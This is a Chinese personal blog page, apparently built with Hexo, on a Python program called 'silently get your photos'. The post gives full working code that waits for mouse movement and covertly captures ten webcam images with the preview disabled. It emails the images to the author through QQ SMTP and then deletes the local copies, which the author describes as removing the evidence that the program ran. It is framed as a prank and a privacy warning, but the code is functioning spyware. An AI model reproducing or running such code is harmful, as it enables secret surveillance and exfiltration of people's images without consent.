@@ -1,0 +1,824 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://murhyimgur.oss-cn-beijing.aliyuncs.com/website/星星.png">
+  <link rel="icon" href="https://murhyimgur.oss-cn-beijing.aliyuncs.com/website/星星.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Murphy">
+  <meta name="keywords" content="Murphy,CosmicDusty,murphy,cosmicdusty,cn">
+  
+    <meta name="description" content="这是我觉得我做的比较厉害的，稍有含金量的程序，感觉很有意思！做了这个程序，发给了几个朋友，发现大多数人都没有遮挡电脑摄像头的习习惯。我这个编程水平不怎么样的人，都能够写出这样一个程序，说明，获取人的图像隐私就这么悄无声息，这么容易。互联网上时刻保持警惕，注意自己的隐私安全！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="悄无声息获取你的照片">
+<meta property="og:url" content="https://cosmicdusty.cc/post/Ideas/GetYourPhotos/index.html">
+<meta property="og:site_name" content="MurphyHou">
+<meta property="og:description" content="这是我觉得我做的比较厉害的，稍有含金量的程序，感觉很有意思！做了这个程序，发给了几个朋友，发现大多数人都没有遮挡电脑摄像头的习习惯。我这个编程水平不怎么样的人，都能够写出这样一个程序，说明，获取人的图像隐私就这么悄无声息，这么容易。互联网上时刻保持警惕，注意自己的隐私安全！">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://murhyimgur.oss-cn-beijing.aliyuncs.com/website/hacking-2903156_1920.jpg">
+<meta property="article:published_time" content="2021-04-22T13:19:28.000Z">
+<meta property="article:modified_time" content="2023-05-05T14:19:49.000Z">
+<meta property="article:author" content="Murphy">
+<meta property="article:tag" content="open source">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="OpenCV">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://murhyimgur.oss-cn-beijing.aliyuncs.com/website/hacking-2903156_1920.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>悄无声息获取你的照片 - MurphyHou</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"cosmicdusty.cc","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://murhyimgur.oss-cn-beijing.aliyuncs.com/website/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"16d93d5abbd7ea15ec53daed5459ebf7","google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"JijHNKemeVNog4wF7g9I5TR3","app_key":"FvsKdxHOP2aG5rHrHby5aV0b","server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?16d93d5abbd7ea15ec53daed5459ebf7";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CosmicDusty</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://murhyimgur.oss-cn-beijing.aliyuncs.com/website/hacking-2903156_1920.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="悄无声息获取你的照片"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Murphy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-04-22 21:19" pubdate>
+          2021年4月22日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">悄无声息获取你的照片</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="关于项目"><a href="#关于项目" class="headerlink" title="关于项目"></a>关于项目</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><ul>
+<li>很久之前学习了python的CV库调用并打开电脑摄像头的程序；</li>
+<li>之后又增加了按键盘的某个键就会拍照的功能；</li>
+<li>然后我想有没有可能通过一些别的功能，将拍下的照片发送给我，不是为了获取什么隐私，只是与朋友之间大玩笑而已；</li>
+<li>首先是自动拍照的功能的实现，我选了监控键盘和鼠标的动作的python库–pyinput。如果打开了应用程序，通过监控鼠标的运动，如果鼠标动了，就激活了程序，拍摄一定数量的照片；</li>
+<li>然后就是将照片发送给我的功能实现，这起初确实是一个比较困难的事情，发送文件得借助第三方软件；</li>
+<li>在我苦思冥想的时候，我想到了邮件，邮件，邮件！！！</li>
+<li>python有yagmail库，可以实现自动发送邮件；</li>
+<li>QQ邮箱可以打开STMP,POP3,IMAP等协议，实现远程调用QQ邮箱发送邮件的功能；</li>
+<li>所以这个程序的出现也就水到渠成了；</li>
+</ul>
+<h2 id="程序目标"><a href="#程序目标" class="headerlink" title="程序目标"></a>程序目标</h2><ul>
+<li>捕获打开程序的人的图片</li>
+<li>将图片自动发送给我</li>
+<li>程序需要较强的娱乐性，简单性</li>
+<li>程序最好只在自己的朋友圈子中传递</li>
+</ul>
+<h2 id="选择编程语言"><a href="#选择编程语言" class="headerlink" title="选择编程语言"></a>选择编程语言</h2><ul>
+<li>python——Windows开发</li>
+<li>python的第三方库很多，及其方便于做一些新奇的小玩意</li>
+</ul>
+<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><h4 id="opencv"><a href="#opencv" class="headerlink" title="opencv"></a>opencv</h4><ul>
+<li>通过opencv拍摄程序调用者的照片</li>
+<li>opencv可以方便的对拍摄的照片进行保存</li>
+</ul>
+<h4 id="程序触发方式"><a href="#程序触发方式" class="headerlink" title="程序触发方式"></a>程序触发方式</h4><ul>
+<li>直接触发&#x2F;手动触发</li>
+</ul>
+<h4 id="图片发送方式"><a href="#图片发送方式" class="headerlink" title="图片发送方式"></a>图片发送方式</h4><ul>
+<li>思来想去，觉得最方便的应该是邮件的方式了</li>
+<li>自动化邮件之类的项目应该是一个比较成熟的了</li>
+</ul>
+<h4 id="程序测试方式"><a href="#程序测试方式" class="headerlink" title="程序测试方式"></a>程序测试方式</h4><ul>
+<li>测试对象是：朋友们，因为使用照片拍摄，涉及到了个人隐私问题，程序不便于广泛地传播</li>
+</ul>
+<h1 id="项目完整代码"><a href="#项目完整代码" class="headerlink" title="项目完整代码"></a>项目完整代码</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python:3.8.6<br>os<br>yamail<br>opencv<br>pynput<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding : utf-8 -*-</span><br><span class="hljs-comment"># Time       : 2021/7/26 10:08</span><br><span class="hljs-comment"># Author     : MurphyHou</span><br><span class="hljs-comment"># Proj_Name  : cv_capture</span><br><span class="hljs-comment"># File_Name  : capture_demo4.py</span><br><span class="hljs-comment"># Software   : PyCharm</span><br><span class="hljs-comment"># =======Here We Go!=======</span><br><br><span class="hljs-comment"># README：程序中标注的“xxx”是需要自己进行设置的</span><br><br><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">from</span> pynput.mouse <span class="hljs-keyword">import</span> Listener<br><span class="hljs-keyword">import</span> yagmail<br><span class="hljs-keyword">import</span> os<br><br>mouse_return=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_move</span>(<span class="hljs-params">x,y</span>):<span class="hljs-comment"># 监听鼠标的位置</span><br>    <span class="hljs-comment"># print(&quot;mouse:&#123;&#125;&quot;.format(x,y))</span><br>    <span class="hljs-keyword">global</span> mouse_return<br>    mouse_return=x<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># 不能返回True,否则程序不会停止</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_mail</span>():<br>    <span class="hljs-comment"># 设置邮箱服务器</span><br>    mail_host=<span class="hljs-string">&quot;smtp.qq.com&quot;</span><br>    <span class="hljs-comment"># 设置发送方邮箱</span><br>    mail_sender=<span class="hljs-string">&#x27;xxx@qq.com&#x27;</span><br>    <span class="hljs-comment"># 设置发送方邮箱密码</span><br>    mail_pass=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-comment">#自助查询-设备管理-自动发送邮件</span><br>    <span class="hljs-comment"># 设置接收方邮箱</span><br>    mail_receiver=<span class="hljs-string">&#x27;xxx@qq.com&#x27;</span><br>    <span class="hljs-comment"># mail_receiver[&#x27;xxx.qq.com&#x27;,&#x27;xxx.163.com&#x27;,&#x27;xxx.outlook.com&#x27;] # 设置多个接收方</span><br><br>    yag = yagmail.SMTP(user=mail_sender,password=mail_pass,host=mail_host)<br><br>    contents=\<br>        [<span class="hljs-string">&#x27;CameraControl from yagmail&#x27;</span>,<span class="hljs-comment">#邮件正文中写入文字</span><br>         yagmail.inline(<span class="hljs-string">&#x27;MurphyHou_capture_5.jpg&#x27;</span>),<span class="hljs-comment"># 邮件正文中直接插入照片</span><br>         <span class="hljs-string">&#x27;MurphyHou_capture_1.jpg&#x27;</span>,<span class="hljs-comment"># 邮件中按附件方式发送图片</span><br>         <span class="hljs-string">&#x27;MurphyHou_capture_2.jpg&#x27;</span>,<br>         <span class="hljs-string">&#x27;MurphyHou_capture_3.jpg&#x27;</span>,<br>         <span class="hljs-string">&#x27;MurphyHou_capture_4.jpg&#x27;</span>,<br>         <span class="hljs-string">&#x27;MurphyHou_capture_6.jpg&#x27;</span>,<br>         <span class="hljs-string">&#x27;MurphyHou_capture_7.jpg&#x27;</span>,<br>         <span class="hljs-string">&#x27;MurphyHou_capture_8.jpg&#x27;</span>,<br>         <span class="hljs-string">&#x27;MurphyHou_capture_9.jpg&#x27;</span>,<br>         <span class="hljs-string">&#x27;MurphyHou_capture_10.jpg&#x27;</span><br>         ]<br>    <span class="hljs-keyword">try</span>:<br>        yag.send(to=mail_receiver,subject=<span class="hljs-string">&quot;CameraControl from yagmail&quot;</span>,contents=contents)<br>        <span class="hljs-comment"># print(&quot;Send Success!&quot;)</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> error:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error:&quot;</span>,error)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>        file_name=<span class="hljs-string">&quot;MurphyHou_capture_&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;.jpg&quot;</span><br>        <span class="hljs-keyword">if</span> os.path.isfile(file_name):<br>            os.remove(file_name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fie &#123;&#125; doesn&#x27;t exit!&quot;</span>.<span class="hljs-built_in">format</span>(file_name))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Delete Success!&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">with</span> Listener(on_move=on_move) <span class="hljs-keyword">as</span> listener:<br>        listener.join()<br><br>    cap=cv2.VideoCapture(<span class="hljs-number">0</span>)<span class="hljs-comment">#创建对象</span><br>    num=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(cap.isOpened()): <span class="hljs-comment"># 当摄像头被打开时，循环捕捉帧</span><br>        <span class="hljs-keyword">while</span>(num&lt;<span class="hljs-number">11</span>): <span class="hljs-comment"># 设置拍摄10张照片</span><br>            ret_flag, image_show = cap.read()  <span class="hljs-comment"># 函数返回值是有两个参数</span><br>            <span class="hljs-comment"># cv2.imshow(&quot;Capture&quot;, image_show)  # 创建窗口，窗口的显示值为捕捉的图像，名称为Capture。这句话注释了之后则不会显示拍照的窗口</span><br>            <span class="hljs-keyword">if</span> mouse_return!=<span class="hljs-number">0</span>:  <span class="hljs-comment"># 当鼠标发生移动时触发程序</span><br>                <span class="hljs-comment"># 设置窗口大小</span><br>                cap.get(<span class="hljs-number">4</span>)<br>                cap.get(<span class="hljs-number">3</span>)<br><br>                <span class="hljs-comment"># print(&quot;success:&quot;+str(num))</span><br>                cv2.imwrite(<span class="hljs-string">&quot;MurphyHou_capture_&quot;</span>+<span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&quot;.jpg&quot;</span>, image_show)<br>                num += <span class="hljs-number">1</span><br><br>        cap.release()<br>        cv2.destroyAllWindows()   <span class="hljs-comment">#放到检测摄像头是否处于开状态的while循环之内，就能保证窗口在程序运行结束之后可以自动关闭</span><br><br>        send_mail()<br><br>        delete()<span class="hljs-comment">#绝对删除，不会存在回收站中</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="关于项目的思考"><a href="#关于项目的思考" class="headerlink" title="关于项目的思考"></a>关于项目的思考</h1><h2 id="程序的优点"><a href="#程序的优点" class="headerlink" title="程序的优点"></a>程序的优点</h2><ul>
+<li>比较好得实现了目标的功能，符合预期</li>
+<li>程序本身的功能并不是有多少很大的用处，更多的的是朋友之间的玩笑，更重要的是用程序实现了这个功能的过程中，学会了一点点OpenCV的一些基本的使用，以及yagmail自动化邮件的现实，总结就是，实现这个没有多少用的程序过程中学到的一些使用是重要的！</li>
+</ul>
+<h2 id="程序尚存的不足-可以改进的方向"><a href="#程序尚存的不足-可以改进的方向" class="headerlink" title="程序尚存的不足(可以改进的方向)"></a>程序尚存的不足(可以改进的方向)</h2><ul>
+<li><del>程序运行结束后，拍摄的照片（程序运行过的证据doge），删除问题</del>（已添加此功能）</li>
+<li>图片保存路径问题<ul>
+<li>因为无法确定程序运行者将程序下载到了什么路径，目前采用的是将图片直接保存到改程序保存的路径下。这样做的问题是，如果将程序保存到了C盘（包括桌面）中，由于权限问题，图片可能因为没有权限，不能保存；</li>
+<li>可能的改进方向是：首先检测计算机的磁盘信息，判断有多少个磁盘，如果有出去C盘外的其他盘，则将图片保存到其他盘，否则保存到程序所保存的位置！</li>
+</ul>
+</li>
+<li>邮件发送的最大次数<ul>
+<li>邮箱都有发送的最大次数，超过这个次数当日便不能发送了</li>
+<li>这个问题好像不太容易解决，程序无法判断程序今天已经发送过多少次了</li>
+</ul>
+</li>
+<li>对电脑硬件有要求<ul>
+<li>现在很多电脑都没有摄像头，那肯定没办法拍照片的</li>
+</ul>
+</li>
+</ul>
+<h2 id="对程序本身的反思"><a href="#对程序本身的反思" class="headerlink" title="对程序本身的反思"></a>对程序本身的反思</h2><ul>
+<li>因为涉及到人像的拍摄，会涉及到个人隐私问题，所以程序本身并不可以广泛传播</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3/" class="category-chain-item">奇思妙想</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/open-source/" class="print-no-link">#open source</a>
+      
+        <a href="/tags/Python/" class="print-no-link">#Python</a>
+      
+        <a href="/tags/OpenCV/" class="print-no-link">#OpenCV</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>悄无声息获取你的照片</div>
+      <div>https://cosmicdusty.cc/post/Ideas/GetYourPhotos/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Murphy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年4月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/Knowledge/MicrocomputerPrincipleAndSinglechipMicrocomputer/" title="微机原理与单片机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">微机原理与单片机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/Ideas/WordCloudsForMessage/" title="消息记录生成词云">
+                        <span class="hidden-mobile">消息记录生成词云</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"JijHNKemeVNog4wF7g9I5TR3-gzGzoHsz","appKey":"FvsKdxHOP2aG5rHrHby5aV0b","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a rel="nofollow noopener"><span>Powered by</span></a> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span><b>Hexo</b></span></a> <i class="iconfont icon-love"></i> <a rel="nofollow noopener"><span>Themed by</span></a> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span><b>Fluid</b></span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量
+        <span id="busuanzi_value_site_pv"></span>
+        次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数
+        <span id="busuanzi_value_site_uv"></span>
+        人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
